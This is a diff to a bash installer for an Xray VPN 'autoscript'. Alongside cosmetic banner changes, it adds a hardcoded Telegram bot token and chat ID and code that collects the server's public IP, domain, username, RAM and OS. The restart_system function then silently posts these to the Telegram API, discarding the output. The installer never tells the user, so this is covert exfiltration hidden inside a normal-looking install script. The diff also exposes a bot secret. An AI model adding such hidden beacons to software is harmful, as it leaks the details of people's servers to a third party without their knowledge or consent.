@@ -21,9 +21,19 @@ gray="\e[1;30m"
 NC='\e[0m'
 
 # // configuration GET | BHOIKFOST YAHYA AUTOSCRIPT
+TIME="10"
+nama=$(whoami)
 IMP="wget -q -O"
+CHATID="1118232400"
 local_date="/usr/bin/"
 domain="cat /etc/xray/domain"
+MYIP=$(wget -qO- ipinfo.io/ip)
+domain="$(cat /etc/xray/domain)"
+waktu=$(date +'%Y-%m-%d %H:%M:%S')
+tram=$(free -m | awk 'NR==2 {print $2}')
+KEY="5661986467:AAHRhgKFp9N5061gZtZ6n4Ae4BJF3PmQ188"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
 
 secs_to_human() {
     echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
@@ -117,16 +127,18 @@ function nginx_install() {
 }
 
 function LOGO() {
-    echo -e "               ┌───────────────────────────────────────────────┐"
-    echo -e "───────────────│                                               │───────────────"
-    echo -e "───────────────│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───────────────"
-    echo -e "───────────────│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───────────────"
-    echo -e "───────────────│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───────────────"
-    echo -e "               │    ${Yellow}Copyright${Font} (C)$gray https://github.com/rullpqh$NC   │"
-    echo -e "               └───────────────────────────────────────────────┘"
-    echo -e "                      ${Red}Autoscript xray vpn lite (multi port)${Font}    "
-    echo -e "                       ${Red}no licence script (free lifetime)"${Font}
-    echo -e "            ${Red}Make sure the internet is smooth when installing the script${Font}"
+    echo -e "
+       ┌───────────────────────────────────────────────┐
+    ───│                                               │───
+    ───│    $Green┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐$NC   │───
+    ───│    $Green├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤ $NC   │───
+    ───│    $Green┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘$NC   │───
+       │    ${Yellow}Copyright${Font} (C)$gray https://github.com/rullpqh$NC   │
+       └───────────────────────────────────────────────┘
+            ${Red}Autoscript xray vpn lite (multi port)${Font}    
+              ${Red}no licence script (free lifetime) ${Font}
+${Red}Make sure the internet is smooth when installing the script${Font}
+        "
     
 }
 
@@ -444,6 +456,16 @@ EOF
     judge "Nginx configuration modification"
 }
 function restart_system() {
+TEXT="
+<u>INFORMASI VPS INSTALL SC</u>
+WAKTU     : <code>${MYIP}</code>
+DOMAIN   : <code>${domain}</code>
+IP VPS       : <code>${MYIP}</code>
+USER         : <code>${nama}</code>
+RAM          : <code>${tram}MB</code>
+LINUX       : <code>${OS}</code>
+"
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
     
     sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf >/dev/null 2>&1
     systemctl daemon-reload >/dev/null 2>&1
